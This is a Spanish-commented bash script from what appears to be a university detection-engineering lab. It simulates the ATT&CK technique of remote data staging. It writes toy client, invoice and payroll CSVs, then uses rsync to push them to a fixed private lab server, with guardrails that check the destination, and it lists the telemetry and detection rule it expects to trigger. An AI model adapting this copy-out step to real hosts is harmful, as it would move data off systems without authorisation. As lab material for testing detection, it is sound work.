#!/usr/bin/env bash
# ============================================================================
# ATA040 · T1074.002 Remote Data Staging — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1074.002 Remote Data Staging (tactica Collection). El atacante
#           MUEVE/COPIA el material ya "recolectado" a un DESTINO REMOTO (un
#           recurso del servidor del laboratorio), en vez de dejarlo local
#           (ATA011/T1074.001 = staging LOCAL).
# Fuente  : custom (escrito por el TFG)
# Objetivo: copiar el staging local al recurso REMOTO `incoming` del servidor
#           (manager) y verificar la llegada por sha256.
# Recurso : rsync://192.168.65.128:9873/incoming/  (modulo `incoming`, lectura-escritura)
# Ejecuta : desde /home/angel/lab-attack/ATA040 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ MONTAJE (paso 0): mismo recurso compartido que ATA039 (el manager no tiene
#    cliente NFS/SMB en la victima); aqui se usa el modulo ESCRIBIBLE `incoming`
#    para el STAGING REMOTO. "Montar"/"desmontar": daemon rsync levantado antes
#    de t0 / parado tras t1 (ver README §9 y cierre de la tanda).
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el destino DEBE ser el recurso del laboratorio (192.168.65.128:9873);
#   - la semilla vive en $HOME/lab-attack/ATA040; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de rsync (cliente que envia el staging al recurso remoto) -> 80792 (deteccion; T1074.002-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA040/*` (T1074.002-S2).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el sha256 de los ficheros
#   enviados coincide con el sha256 de los ficheros presentes en el recurso
#   remoto (comprobado en el manager).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA040"
STAGE="${BASE}/staging"
SRV="192.168.65.128"
PORT="9873"
MOD="incoming"
DEST_NAME="ATA040"
URL="rsync://${SRV}:${PORT}/${MOD}/${DEST_NAME}/"

echo "ATA040 · T1074.002 Remote Data Staging (rsync envia el staging al recurso remoto) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
if ! command -v rsync >/dev/null 2>&1; then
  echo "ERROR: rsync no disponible" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el recurso del laboratorio (VMnet1).
if [ "$SRV" != "192.168.65.128" ] || [ "$PORT" != "9873" ]; then
  echo "ERROR: destino '$SRV:$PORT' fuera del recurso del laboratorio (abortado)" >&2
  exit 1
fi
# GUARDARRAIL: la semilla DEBE quedar bajo la carpeta del ataque.
case "$STAGE" in
  "$HOME/lab-attack/ATA040"*) : ;;
  *) echo "ERROR: staging '$STAGE' no esta bajo lab-attack/ATA040 (abortado)" >&2; exit 1 ;;
esac

# --- recurso compartido accesible? (aborta ruidosamente si el daemon no esta) ---
if ! rsync --list-only "rsync://${SRV}:${PORT}/${MOD}/" >/dev/null 2>&1; then
  echo "ERROR: recurso remoto no accesible (rsync://${SRV}:${PORT}/${MOD}/); ¿daemon rsync?" >&2
  exit 1
fi

# 0) SIEMBRA del material "ya recolectado" (datos de juguete; builtin printf, sin execve).
mkdir -p "$STAGE"
if [ ! -f "$STAGE/clientes.csv" ]; then printf 'cliente,segmento,facturacion_eur\nAcme,empresa,182340.50\nNorte,empresa,45310.75\n' > "$STAGE/clientes.csv"; fi
if [ ! -f "$STAGE/facturas.csv" ]; then printf 'factura,cliente,importe_eur\nF-2026-001,Acme,18450.00\nF-2026-002,Norte,15200.00\n' > "$STAGE/facturas.csv"; fi
if [ ! -f "$STAGE/nominas.csv" ]; then printf 'empleado,departamento,bruto_eur\nA.Ruiz,IT,3200.00\nB.Soto,Ventas,2900.00\n' > "$STAGE/nominas.csv"; fi

echo "--- MATERIAL A ESTAGIAR (sha256 local) ---"
find "$STAGE" -type f -print0 | sort -z | xargs -0 sha256sum

# 1) STAGING REMOTO: copia el material al recurso remoto del servidor (execve de rsync).
rsync -a --stats "$STAGE/" "$URL"

echo "--- estado final ---"
n_files=$(find "$STAGE" -type f | wc -l)
echo "ficheros_estagiados=${n_files}"
if [ "$n_files" -ge 1 ]; then
  echo "STAGING_REMOTO=OK ($n_files ficheros enviados al recurso remoto ${URL})"
else
  echo "STAGING_REMOTO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
